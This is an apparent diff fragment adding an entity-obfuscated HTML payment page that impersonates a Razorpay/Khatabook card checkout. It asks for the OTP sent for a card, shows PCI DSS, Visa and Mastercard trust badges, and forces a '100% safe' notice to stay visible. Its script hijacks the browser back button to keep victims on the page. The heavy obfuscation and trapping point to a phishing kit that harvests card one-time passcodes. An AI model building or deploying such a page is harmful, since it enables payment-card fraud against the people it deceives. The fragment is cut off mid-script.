+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<path d="&#77;&#49;&#50;&#32;&#50;&#50;&#67;&#49;&#55;&#46;&#53;&#50;&#50;&#56;&#32;&#50;&#50;&#32;&#50;&#50;&#32;&#49;&#55;&#46;&#53;&#50;&#50;&#56;&#32;&#50;&#50;&#32;&#49;&#50;&#67;&#50;&#50;&#32;&#54;&#46;&#52;&#55;&#55;&#49;&#53;&#32;&#49;&#55;&#46;&#53;&#50;&#50;&#56;&#32;&#50;&#32;&#49;&#50;&#32;&#50;&#67;&#54;&#46;&#52;&#55;&#55;&#49;&#53;&#32;&#50;&#32;&#50;&#32;&#54;&#46;&#52;&#55;&#55;&#49;&#53;&#32;&#50;&#32;&#49;&#50;&#67;&#50;&#32;&#49;&#55;&#46;&#53;&#50;&#50;&#56;&#32;&#54;&#46;&#52;&#55;&#55;&#49;&#53;&#32;&#50;&#50;&#32;&#49;&#50;&#32;&#50;&#50;&#90;"/>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</svg>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</button>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</form>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div id="&#111;&#116;&#112;&#70;&#111;&#114;&#109;" class="&#97;&#110;&#105;&#109;&#97;&#116;&#101;&#45;&#115;&#108;&#105;&#100;&#101;&#45;&#105;&#110;&#32;&#104;&#105;&#100;&#100;&#101;&#110;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<p class="&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#54;&#48;&#48;&#32;&#109;&#98;&#45;&#50;">&#79;&#84;&#80;&#32;&#104;&#97;&#115;&#32;&#98;&#101;&#101;&#110;&#32;&#115;&#101;&#110;&#116;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#114;&#101;&#103;&#105;&#115;&#116;&#101;&#114;&#101;&#100;&#32;&#109;&#111;&#98;&#105;&#108;&#101;&#32;&#110;&#117;&#109;&#98;&#101;&#114;&#32;&#102;&#111;&#114;&#32;&#99;&#97;&#114;&#100;&#32;&#101;&#110;&#100;&#105;&#110;&#103;&#32;&#105;&#110;&#32;<span id="&#99;&#97;&#114;&#100;&#76;&#97;&#115;&#116;&#70;&#111;&#117;&#114;"></span></p>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#111;&#116;&#112;&#45;&#99;&#111;&#110;&#116;&#97;&#105;&#110;&#101;&#114;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#111;&#116;&#112;&#45;&#105;&#110;&#112;&#117;&#116;&#45;&#119;&#114;&#97;&#112;&#112;&#101;&#114;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="&#116;&#101;&#120;&#116;" id="&#111;&#116;&#112;" maxlength="&#54;" class="&#111;&#116;&#112;&#45;&#105;&#110;&#112;&#117;&#116;&#32;&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#112;&#120;&#45;&#51;&#32;&#112;&#121;&#45;&#50;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#103;&#114;&#97;&#121;&#45;&#51;&#48;&#48;&#32;&#116;&#101;&#120;&#116;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#116;&#101;&#120;&#116;&#45;&#108;&#103;&#32;&#116;&#114;&#97;&#99;&#107;&#105;&#110;&#103;&#45;&#119;&#105;&#100;&#101;&#114;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#110;&#111;&#110;&#101;" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#79;&#84;&#80;" required>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#111;&#116;&#112;&#45;&#98;&#117;&#116;&#116;&#111;&#110;&#45;&#119;&#114;&#97;&#112;&#112;&#101;&#114;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<button type="&#98;&#117;&#116;&#116;&#111;&#110;" id="&#111;&#116;&#112;&#83;&#117;&#98;&#109;&#105;&#116;&#66;&#117;&#116;&#116;&#111;&#110;" class="&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#98;&#103;&#45;&#103;&#114;&#97;&#121;&#45;&#52;&#48;&#48;&#32;&#116;&#101;&#120;&#116;&#45;&#119;&#104;&#105;&#116;&#101;&#32;&#112;&#121;&#45;&#50;&#32;&#112;&#120;&#45;&#52;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#110;&#111;&#110;&#101;&#32;&#102;&#108;&#101;&#120;&#32;&#105;&#116;&#101;&#109;&#115;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#106;&#117;&#115;&#116;&#105;&#102;&#121;&#45;&#99;&#101;&#110;&#116;&#101;&#114;" disabled>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span id="&#111;&#116;&#112;&#84;&#101;&#120;&#116;">&#67;&#111;&#110;&#102;&#105;&#114;&#109;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div id="&#111;&#116;&#112;&#76;&#111;&#97;&#100;&#101;&#114;" class="&#119;&#45;&#53;&#32;&#104;&#45;&#53;&#32;&#97;&#110;&#105;&#109;&#97;&#116;&#101;&#45;&#115;&#112;&#105;&#110;&#32;&#104;&#105;&#100;&#100;&#101;&#110;&#32;&#109;&#108;&#45;&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<svg viewBox="&#48;&#32;&#48;&#32;&#50;&#52;&#32;&#50;&#52;" fill="&#110;&#111;&#110;&#101;" stroke="&#99;&#117;&#114;&#114;&#101;&#110;&#116;&#67;&#111;&#108;&#111;&#114;" stroke-width="&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<path d="&#77;&#49;&#50;&#32;&#50;&#50;&#67;&#49;&#55;&#46;&#53;&#50;&#50;&#56;&#32;&#50;&#50;&#32;&#50;&#50;&#32;&#49;&#55;&#46;&#53;&#50;&#50;&#56;&#32;&#50;&#50;&#32;&#49;&#50;&#67;&#50;&#50;&#32;&#54;&#46;&#52;&#55;&#55;&#49;&#53;&#32;&#49;&#55;&#46;&#53;&#50;&#50;&#56;&#32;&#50;&#32;&#49;&#50;&#32;&#50;&#67;&#54;&#46;&#52;&#55;&#55;&#49;&#53;&#32;&#50;&#32;&#50;&#32;&#54;&#46;&#52;&#55;&#55;&#49;&#53;&#32;&#50;&#32;&#49;&#50;&#67;&#50;&#32;&#49;&#55;&#46;&#53;&#50;&#50;&#56;&#32;&#54;&#46;&#52;&#55;&#55;&#49;&#53;&#32;&#50;&#50;&#32;&#49;&#50;&#32;&#50;&#50;&#90;"/>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</svg>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</button>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<p id="&#111;&#116;&#112;&#69;&#114;&#114;&#111;&#114;" class="&#111;&#116;&#112;&#45;&#101;&#114;&#114;&#111;&#114;">&#73;&#110;&#99;&#111;&#114;&#114;&#101;&#99;&#116;&#32;&#79;&#84;&#80;&#46;&#32;&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#101;&#110;&#116;&#101;&#114;&#32;&#97;&#32;&#118;&#97;&#108;&#105;&#100;&#32;&#111;&#110;&#101;&#32;&#116;&#105;&#109;&#101;&#32;&#112;&#97;&#115;&#115;&#99;&#111;&#100;&#101;&#46;</p>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<p class="&#116;&#101;&#120;&#116;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#53;&#48;&#48;&#32;&#109;&#116;&#45;&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#84;&#105;&#109;&#101;&#32;&#114;&#101;&#109;&#97;&#105;&#110;&#105;&#110;&#103;&#58;&#32;<span id="&#116;&#105;&#109;&#101;&#114;">&#50;&#58;&#53;&#57;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</p>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<!-- Consent message: Force visible with inline style -->&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#99;&#111;&#110;&#115;&#101;&#110;&#116;&#45;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#32;&#109;&#116;&#45;&#52;" id="&#99;&#111;&#110;&#115;&#101;&#110;&#116;&#77;&#101;&#115;&#115;&#97;&#103;&#101;" style="&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#102;&#108;&#101;&#120;&#32;&#33;&#105;&#109;&#112;&#111;&#114;&#116;&#97;&#110;&#116;&#59;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#99;&#111;&#110;&#115;&#101;&#110;&#116;&#45;&#99;&#104;&#101;&#99;&#107;&#98;&#111;&#120;&#32;&#99;&#104;&#101;&#99;&#107;&#101;&#100;" id="&#99;&#111;&#110;&#115;&#101;&#110;&#116;&#67;&#104;&#101;&#99;&#107;&#98;&#111;&#120;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<svg viewBox="&#48;&#32;&#48;&#32;&#50;&#52;&#32;&#50;&#52;" fill="&#110;&#111;&#110;&#101;" stroke="&#99;&#117;&#114;&#114;&#101;&#110;&#116;&#67;&#111;&#108;&#111;&#114;" stroke-width="&#51;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<path d="&#77;&#53;&#32;&#49;&#51;&#108;&#52;&#32;&#52;&#76;&#49;&#57;&#32;&#55;"/>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</svg>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span>&#78;&#111;&#116;&#101;&#58;&#32;&#77;&#97;&#107;&#105;&#110;&#103;&#32;&#80;&#97;&#121;&#109;&#101;&#110;&#116;&#32;&#119;&#105;&#116;&#104;&#32;&#82;&#97;&#122;&#111;&#114;&#112;&#97;&#121;&#32;&#105;&#115;&#32;&#49;&#48;&#48;&#37;&#32;&#115;&#97;&#102;&#101;&#46;&#32;&#89;&#111;&#117;&#114;&#32;&#116;&#114;&#97;&#110;&#115;&#97;&#99;&#116;&#105;&#111;&#110;&#32;&#105;&#115;&#32;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#101;&#100;&#32;&#116;&#104;&#114;&#111;&#117;&#103;&#104;&#32;&#97;&#32;&#115;&#101;&#99;&#117;&#114;&#101;&#32;&#104;&#116;&#116;&#112;&#115;&#32;&#99;&#111;&#110;&#110;&#101;&#99;&#116;&#105;&#111;&#110;&#46;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;&#32;&#32;<div class="&#98;&#111;&#116;&#116;&#111;&#109;&#45;&#108;&#111;&#103;&#111;&#115;&#32;&#102;&#108;&#101;&#120;&#32;&#106;&#117;&#115;&#116;&#105;&#102;&#121;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#105;&#116;&#101;&#109;&#115;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#103;&#97;&#112;&#45;&#54;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;<img src="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#117;&#112;&#108;&#111;&#97;&#100;&#46;&#119;&#105;&#107;&#105;&#109;&#101;&#100;&#105;&#97;&#46;&#111;&#114;&#103;&#47;&#119;&#105;&#107;&#105;&#112;&#101;&#100;&#105;&#97;&#47;&#99;&#111;&#109;&#109;&#111;&#110;&#115;&#47;&#56;&#47;&#56;&#51;&#47;&#75;&#104;&#97;&#116;&#97;&#98;&#111;&#111;&#107;&#46;&#115;&#118;&#103;" alt="&#80;&#111;&#119;&#101;&#114;&#101;&#100;&#32;&#98;&#121;&#32;&#75;&#104;&#97;&#116;&#97;&#98;&#111;&#111;&#107;" class="&#104;&#45;&#54;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;<img src="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#99;&#105;&#115;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#115;&#116;&#97;&#110;&#100;&#97;&#114;&#100;&#115;&#46;&#111;&#114;&#103;&#47;&#119;&#112;&#45;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#47;&#117;&#112;&#108;&#111;&#97;&#100;&#115;&#47;&#50;&#48;&#50;&#50;&#47;&#48;&#51;&#47;&#112;&#99;&#105;&#45;&#108;&#111;&#103;&#111;&#45;&#116;&#101;&#97;&#108;&#46;&#115;&#118;&#103;" alt="&#80;&#67;&#73;&#32;&#68;&#83;&#83;" class="&#104;&#45;&#54;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;<img src="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#108;&#111;&#103;&#111;&#106;&#105;&#110;&#110;&#105;&#46;&#99;&#111;&#109;&#47;&#105;&#109;&#97;&#103;&#101;&#47;&#108;&#111;&#103;&#111;&#115;&#47;&#114;&#97;&#122;&#111;&#114;&#112;&#97;&#121;&#46;&#115;&#118;&#103;" alt="&#82;&#97;&#122;&#111;&#114;&#112;&#97;&#121;" class="&#104;&#45;&#52;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;<img src="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#109;&#97;&#115;&#116;&#101;&#114;&#99;&#97;&#114;&#100;&#46;&#117;&#115;&#47;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#47;&#100;&#97;&#109;&#47;&#112;&#117;&#98;&#108;&#105;&#99;&#47;&#109;&#97;&#115;&#116;&#101;&#114;&#99;&#97;&#114;&#100;&#99;&#111;&#109;&#47;&#110;&#97;&#47;&#117;&#115;&#47;&#101;&#110;&#47;&#104;&#111;&#109;&#101;&#112;&#97;&#103;&#101;&#47;&#72;&#111;&#109;&#101;&#47;&#109;&#99;&#45;&#108;&#111;&#103;&#111;&#45;&#53;&#50;&#46;&#115;&#118;&#103;" alt="&#77;&#97;&#115;&#116;&#101;&#114;&#99;&#97;&#114;&#100;&#32;&#83;&#101;&#99;&#117;&#114;&#101;&#67;&#111;&#100;&#101;" class="&#104;&#45;&#54;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;<img src="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#117;&#115;&#97;&#46;&#118;&#105;&#115;&#97;&#46;&#99;&#111;&#109;&#47;&#100;&#97;&#109;&#47;&#86;&#67;&#79;&#77;&#47;&#114;&#101;&#103;&#105;&#111;&#110;&#97;&#108;&#47;&#118;&#101;&#47;&#114;&#111;&#109;&#97;&#110;&#105;&#97;&#47;&#98;&#108;&#111;&#103;&#115;&#47;&#104;&#101;&#114;&#111;&#45;&#105;&#109;&#97;&#103;&#101;&#47;&#118;&#105;&#115;&#97;&#45;&#108;&#111;&#103;&#111;&#45;&#56;&#48;&#48;&#120;&#52;&#53;&#48;&#46;&#106;&#112;&#103;" alt="&#86;&#101;&#114;&#105;&#102;&#105;&#101;&#100;&#32;&#98;&#121;&#32;&#86;&#105;&#115;&#97;" class="&#104;&#45;&#54;" />&#13;
+&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;<!-- Back Button Interception Script -->&#13;
+&#32;&#32;<script>&#13;
+&#32;&#32;&#32;&#32;&#47;&#47;&#32;&#87;&#104;&#101;&#110;&#32;&#116;&#104;&#101;&#32;&#112;&#97;&#103;&#101;&#32;&#108;&#111;&#97;&#100;&#115;&#44;&#32;&#112;&#117;&#115;&#104;&#32;&#97;&#32;&#100;&#117;&#109;&#109;&#121;&#32;&#115;&#116;&#97;&#116;&#101;&#32;&#115;&#111;&#32;&#98;&#97;&#99;&#107;&#32;&#98;&#117;&#116;&#116;&#111;&#110;&#32;&#116;&#114;&#105;&#103;&#103;&#101;&#114;&#115;&#32;&#112;&#111;&#112;&#115;&#116;&#97;&#116;&#101;&#46;&#13;
+&#32;&#32;&#32;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#97;&#100;&#100;&#69;&#118;&#101;&#110;&#116;&#76;&#105;&#115;&#116;&#101;&#110;&#101;&#114;&#40;&#34;&#108;&#111;&#97;&#100;&#34;&#44;&#32;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#40;&#41;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#104;&#105;&#115;&#116;&#111;&#114;&#121;&#46;&#112;&#117;&#115;&#104;&#83;&#116;&#97;&#116;&#101;&#40;&#110;&#117;&#108;&#108;&#44;&#32;&#34;&#34;&#44;&#32;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#46;&#104;&#114;&#101;&#102;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#41;&#59;&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#97;&#100;&#100;&#69;&#118;&#101;&#110;&#116;&#76;&#105;&#115;&#116;&#101;&#110;&#101;&#114;&#40;&#34;&#112;&#111;&#112;&#115;&#116;&#97;&#116;&#101;&#34;&#44;&#32;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#40;&#101;&#118;&#101;&#110;&#116;&#41;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#47;&#47;&#32;&#80;&#117;&#115;&#104;&#32;&#115;&#116;&#97;&#116;&#101;&#32;&#97;&#103;&#97;&#105;&#110;&#32;&#116;&#111;&#32;&#112;&#114;&#101;&#118;&#101;&#110;&#116;&#32;&#110;&#97;&#118;&#105;&#103;&#97;&#116;&#105;&#111;&#110;&#46;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#104;&#105;&#115;&#116;&#111;&#114;&#121;&#46;&#112;&#117;&#115;&#104;&#83;&#116;&#97;&#116;&#101;&#40;&#110;&#117;&#108;&#108;&#44;&#32;&#34;&#34;&#44;&#32;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#46;&#104;&#114;&#101;&#102;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#115;&#104;&#111;&#119;&#67;&#97;&#110;&#99;&#101;&#108;&#77;&#111;&#100;&#97;&#108;&#40;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#41;&#59;&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#115;&#104;&#111;&#119;&#67;&#97;&#110;&#99;&#101;&#108;&#77;&#111;&#100;&#97;&#108;&#40;&#41;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#118;&#97;&#114;&#32;&#109;&#111;&#100;&#97;&#108;&#32;&#61;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#103;&#101;&#116;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#66;&#121;&#73;&#100;&#40;&#34;&#99;&#97;&#110;&#99;&#101;&#108;&#77;&#111;&#100;&#97;&#108;&#34;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#105;&#102;&#32;&#40;&#33;&#109;&#111;&#100;&#97;&#108;&#41;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#32;&#61;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#100;&#105;&#118;&#34;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#105;&#100;&#32;&#61;&#32;&#34;&#99;&#97;&#110;&#99;&#101;&#108;&#77;&#111;&#100;&#97;&#108;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#112;&#111;&#115;&#105;&#116;&#105;&#111;&#110;&#32;&#61;&#32;&#34;&#102;&#105;&#120;&#101;&#100;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#116;&#111;&#112;&#32;&#61;&#32;&#34;&#48;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#108;&#101;&#102;&#116;&#32;&#61;&#32;&#34;&#48;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#119;&#105;&#100;&#116;&#104;&#32;&#61;&#32;&#34;&#49;&#48;&#48;&#37;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#104;&#101;&#105;&#103;&#104;&#116;&#32;&#61;&#32;&#34;&#49;&#48;&#48;&#37;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#67;&#111;&#108;&#111;&#114;&#32;&#61;&#32;&#34;&#114;&#103;&#98;&#97;&#40;&#48;&#44;&#48;&#44;&#48;&#44;&#48;&#46;&#53;&#41;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#32;&#61;&#32;&#34;&#102;&#108;&#101;&#120;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#97;&#108;&#105;&#103;&#110;&#73;&#116;&#101;&#109;&#115;&#32;&#61;&#32;&#34;&#99;&#101;&#110;&#116;&#101;&#114;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#106;&#117;&#115;&#116;&#105;&#102;&#121;&#67;&#111;&#110;&#116;&#101;&#110;&#116;&#32;&#61;&#32;&#34;&#99;&#101;&#110;&#116;&#101;&#114;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#122;&#73;&#110;&#100;&#101;&#120;&#32;&#61;&#32;&#34;&#49;&#48;&#48;&#48;&#48;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#105;&#110;&#110;&#101;&#114;&#72;&#84;&#77;&#76;&#32;&#61;&#32;&#39;<div style="&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#58;&#32;&#35;&#102;&#102;&#102;&#59;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#50;&#48;&#112;&#120;&#59;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#114;&#97;&#100;&#105;&#117;&#115;&#58;&#32;&#53;&#112;&#120;&#59;&#32;&#116;&#101;&#120;&#116;&#45;&#97;&#108;&#105;&#103;&#110;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#32;&#109;&#97;&#120;&#45;&#119;&#105;&#100;&#116;&#104;&#58;&#32;&#51;&#48;&#48;&#112;&#120;&#59;">&#39;&#32;&#43;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#39;<p>&#68;&#111;&#32;&#121;&#111;&#117;&#32;&#119;&#97;&#110;&#116;&#32;&#116;&#111;&#32;&#99;&#97;&#110;&#99;&#101;&#108;&#32;&#116;&#104;&#105;&#115;&#32;&#116;&#114;&#97;&#110;&#115;&#97;&#99;&#116;&#105;&#111;&#110;&#63;</p>&#39;&#32;&#43;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#39;<button id="&#99;&#97;&#110;&#99;&#101;&#108;&#89;&#101;&#115;" style="&#109;&#97;&#114;&#103;&#105;&#110;&#58;&#32;&#53;&#112;&#120;&#59;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#53;&#112;&#120;&#32;&#49;&#48;&#112;&#120;&#59;">&#89;&#101;&#115;</button>&#39;&#32;&#43;&#13;
